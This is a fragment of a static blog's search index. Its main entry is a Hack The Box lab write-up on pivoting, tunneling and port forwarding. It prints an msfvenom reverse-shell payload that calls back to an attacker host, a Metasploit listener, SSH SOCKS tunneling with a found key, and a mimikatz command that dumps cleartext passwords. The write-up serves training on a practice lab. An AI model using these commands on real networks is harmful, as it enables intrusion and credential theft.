+        "title": "Pivoting, Tunneling, and Port Forwarding - Skill Assessment",
+        "tags": ["htb","cybersec",],
+        "content": "Initial Access Reconnaissance As from the objectives of the assessment, we start from the webshell, found two user accounts in the /home directory:\nWebadmin: Primary target for initial access Administrator: Potential privilege escalation target Only webadmin was accessible Critical Findings A private SSH key belonging to the webadmin user A file named \u0026ldquo;for-admin-eyes-only\u0026rdquo; containing credentials Reverse Shell Using Metasploit Payload Generation msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=\u0026lt;attacker_ip\u0026gt; -f elf -o payload LPORT=8080 Payload Delivery python3 -m http.server Metasploit Listener Configuration use exploit/multi/handler set LHOST 0.0.0.0 set LPORT 8080 set payload linux/x64/meterpreter/reverse_tcp Network Enumeration Network Discovery Performed ping sweep and found the internal IP 172.16.5.35: run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23 Dynamic Tunneling Using SSH As We found the private key to webadmin, we can Dynamic Port Forward using ssh(or use Metasploit as an Socks Proxy): ssh -i id_rsa -D 9050 webadmin@\u0026lt;target_ip\u0026gt; Lateral Movement Used Proxychains to login with discovered credentials Located first flag Privilege Escalation Next the question was what user was vulnerable?, We can tell the user \u0026lsquo;vfrank\u0026rsquo;(I just checked the users folder, so I just submitted it as user), now we have to how this user is vulnerable.. well one obvious answer would be active directory(LSASS) so I just copied mimikatz and ran it. privilege::debug sekurlsa::logonpasswords Confirmed vulnerable user account: vfrank Successfully extracted cleartext passwords Network Enumeration Scanned for additional systems: for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find \u0026#34;Reply\u0026#34; Located target IP: 172.16.6.25 Established RDP connection with the credentials. Final Access Flag Retrieval Located flag in C:\\ Domain Controller Access Successfully identified the domain controller Retrieved the final flag ", 
+        "url": "http:\/\/localhost:1313\/posts\/pivotingtunnelingand_portforwarding-skill_assessment\/"
+    },
+    
+    "http:\/\/localhost:1313\/categories\/": {
+        "title": "Categories",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/categories\/"
+    },
+    
+}
+</script>
+<script defer src="/js/lunr.js"></script>
+<script defer src="/js/search.js"></script>
+
+</footer>
+
+</body>
+</html>
+
